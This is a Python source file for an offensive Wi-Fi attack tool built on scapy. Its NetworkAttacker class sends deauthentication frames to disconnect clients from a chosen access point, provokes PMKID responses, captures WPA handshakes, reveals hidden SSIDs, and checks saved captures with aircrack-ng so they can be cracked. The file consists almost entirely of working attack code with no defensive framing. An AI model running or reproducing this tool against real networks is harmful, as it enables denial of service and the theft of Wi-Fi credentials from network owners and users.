# attacker.py
import time
import sys
import threading
import os
import subprocess
from scapy.all import *
from config import C_GREEN, C_RED, C_YELLOW, C_RESET, HANDSHAKES_DIR
from utils import get_vendor, get_current_time_12h
from logger import logger

class NetworkAttacker:
    def __init__(self, interface, target_bssid, target_channel, db_handler, attack_mode="reveal", target_ssid="Unknown"):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.db = db_handler
        self.target_ssid = target_ssid
        self.attack_mode = attack_mode
        
        self.stop_attack = False
        self.success = False
        self.clients = set()
        self.result_data = None
        
        self.handshake_captured = False
        self.pmkid_captured = False
        self.handshake_filename = "" 
        self.eapol_packets = []
        self.best_beacon = None 
        
        self.threads = []
        self.deauth_event = threading.Event()

    def start_deauth_thread(self):
        if self.attack_mode == "passive": return 
        
        self.deauth_event.clear()
        if self.attack_mode == "pmkid":
            t = threading.Thread(target=self._pmkid_attack_loop, daemon=True)
        else:
            t = threading.Thread(target=self._attack_loop, daemon=True)
        t.start()
        self.threads.append(t)

    def join_threads(self):
        """Wait for all threads to complete"""
        self.stop_attack = True
        self.deauth_event.set() 
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=1.0)
                
    def _pmkid_attack_loop(self):
        try:
            my_mac = self.interface_mac()
            pkt_auth = RadioTap()/Dot11(addr1=self.target_bssid, addr2=my_mac, addr3=self.target_bssid)/Dot11Auth(algo=0, seqnum=1, status=0)
            pkt_assoc = RadioTap()/Dot11(addr1=self.target_bssid, addr2=my_mac, addr3=self.target_bssid)/Dot11AssoReq(cap=0x1100, listen_interval=0x00a) / Dot11Elt(ID=0, info=self.target_ssid)
    
            while not self.stop_attack and not self.pmkid_captured:
                try:
                    sendp(pkt_auth, iface=self.interface, verbose=False, count=1)
                    time.sleep(0.1)
                    if self.target_ssid != "Unknown":
                        sendp(pkt_assoc, iface=self.interface, verbose=False, count=1)
                except OSError as e:
                     logger.debug(f"TX failed (PMKID): {e}")
                except Exception as e:
                     logger.debug(f"PMKID Attack Loop Error: {e}")
                time.sleep(2)
        except Exception as e:
            logger.error(f"PMKID Thread Crash: {e}")

    def _attack_loop(self):
        try:
            pkt_deauth_bcast = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, addr3=self.target_bssid)/Dot11Deauth(reason=7)
            pkt_probe = RadioTap()/Dot11(addr1=self.target_bssid, addr2=self.interface_mac(), addr3=self.target_bssid)/Dot11ProbeReq()/Dot11Elt(ID="SSID", info="")
    
            while not self.stop_attack:
                if self.success and self.attack_mode == "reveal": break
                if self.handshake_captured and self.attack_mode == "handshake": break
    
                try:
                    if self.clients:
                        # Convert to list to avoid runtime modification issues
                        current_clients = list(self.clients)
                        for client_mac, _ in current_clients:
                             # 33:33 IPv6 multicast, ff:ff Broadcast
                             if not client_mac.startswith(("33:33", "ff:ff", "01:00")):
                                pkt_client = RadioTap()/Dot11(addr1=client_mac, addr2=self.target_bssid, addr3=self.target_bssid)/Dot11Deauth(reason=7)
                                sendp(pkt_client, iface=self.interface, count=3, verbose=False)
                                time.sleep(0.05)
                    else:
                        sendp(pkt_deauth_bcast, iface=self.interface, count=2, verbose=False)
                    
                    if self.attack_mode != "handshake":
                        sendp(pkt_probe, iface=self.interface, count=1, verbose=False)
                except OSError as e:
                    # Often happens if interface goes down
                    logger.debug(f"TX failed: {e}")
                except Exception as e:
                    logger.debug(f"Attack Loop Error: {e}")
                
                time.sleep(4)
        except Exception as e:
            logger.error(f"Attack Thread Crash: {e}")

    def interface_mac(self):
        try: 
            return get_if_hwaddr(self.interface)
        except: 
            return "00:11:22:33:44:55"

    def sniffer_callback(self, pkt):
        if self.success and self.attack_mode == "reveal": return
        if self.handshake_captured and self.attack_mode == "handshake": return
        if self.pmkid_captured and self.attack_mode == "pmkid": return

        try:
            if pkt.haslayer(Dot11):
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                
                if pkt.type == 0 and pkt.subtype == 8: 
                    if pkt.addr2.lower() == self.target_bssid:
                        if self.best_beacon is None: self.best_beacon = pkt
    
                if self.attack_mode == "pmkid" and pkt.haslayer(EAPOL):
                    if addr2 == self.target_bssid:
                        self.eapol_packets.append(pkt)
                        self.pmkid_captured = True
                        self.handshake_captured = True 
                        self.save_handshake(suffix="_PMKID")
                        self.success = True
                        self.stop_attack = True
                        return
    
                client_mac = None
                if self.target_bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                    client_mac = addr2
                elif self.target_bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                    client_mac = addr1
                
                if client_mac:
                    known = False
                    for c, v in self.clients:
                        if c == client_mac: known = True
                    if not known:
                        vendor = get_vendor(client_mac)
                        self.clients.add((client_mac, vendor))
    
                if pkt.haslayer(EAPOL):
                    if self.target_bssid in [addr1, addr2]:
                        self.eapol_packets.append(pkt)
                        if len(self.eapol_packets) >= 4 and not self.handshake_captured:
                            self.save_handshake()
                            if self.attack_mode == "handshake":
                                # Don't stop yet, verify first in save_handshake
                                pass
    
                # --- Reveal Logic ---
                if self.target_ssid == "Unknown" or self.target_ssid == "<HIDDEN>" or self.attack_mode == "reveal":
                    if pkt.type == 0 and (pkt.subtype == 5 or pkt.subtype == 8): 
                        if self.target_bssid in [addr1, addr2, pkt.addr3]:
                            if pkt.haslayer(Dot11Elt):
                                try:
                                    elt = pkt.getlayer(Dot11Elt)
                                    while elt:
                                        if elt.ID == 0: 
                                            ssid = elt.info.decode('utf-8', errors='ignore')
                                            if ssid and not ssid.startswith("\x00") and len(ssid) > 0:
                                                self.target_ssid = ssid 
                                                self.db.save(self.target_bssid, ssid)
    
                                                self.result_data = {
                                                    "SSID": ssid,
                                                    "BSSID": self.target_bssid,
                                                    "Channel": self.target_channel,
                                                    "Clients": len(self.clients)
                                                }
                                                
                                                if self.attack_mode == "reveal" or self.attack_mode == "passive":
                                                    self.success = True
                                                    self.stop_attack = True
                                                
                                                if self.handshake_captured: self.save_handshake()
                                                return 
                                        elt = elt.payload
                                except Exception as e:
                                    logger.debug(f"ELT parsing error: {e}")
        except Exception as e:
             # Scapy callback errors shouldn't crash main loop
             pass

    def save_handshake(self, suffix=""):
        # 1. Prepare filename
        safe_ssid = "".join([c for c in self.target_ssid if c.isalpha() or c.isdigit() or c==' ']).strip()
        if not safe_ssid or safe_ssid == "<HIDDEN>": safe_ssid = "Unknown_SSID"
        filename = f"{self.target_bssid.replace(':','-')}_{safe_ssid}{suffix}.pcap"
        full_path = os.path.join(HANDSHAKES_DIR, filename)
        
        # 2. Save packets
        packets_to_save = []
        if self.best_beacon: packets_to_save.append(self.best_beacon)
        packets_to_save.extend(self.eapol_packets)
        
        try:
            wrpcap(full_path, packets_to_save)
            
            # 3. Verify with aircrack-ng
            print(f"\n{C_YELLOW}[*] Verifying handshake quality...{C_RESET}")
            
            cmd = ["aircrack-ng", full_path]
            proc = subprocess.run(cmd, capture_output=True, text=True)
            
            if "1 handshake" in proc.stdout:
                self.handshake_captured = True
                self.handshake_filename = full_path
                self.success = True
                
                # Update DB directly from here to ensure sync
                if self.db:
                     self.db.update_handshake(self.target_bssid, True, get_current_time_12h(), full_path)
                
                if self.attack_mode == "handshake":
                    self.stop_attack = True
                    
                print(f"{C_GREEN}[+] VALID HANDSHAKE CONFIRMED!{C_RESET}")
            else:
                os.remove(full_path)
                self.eapol_packets = [] 
                
        except Exception as e:
            logger.error(f"Save Error: {e}")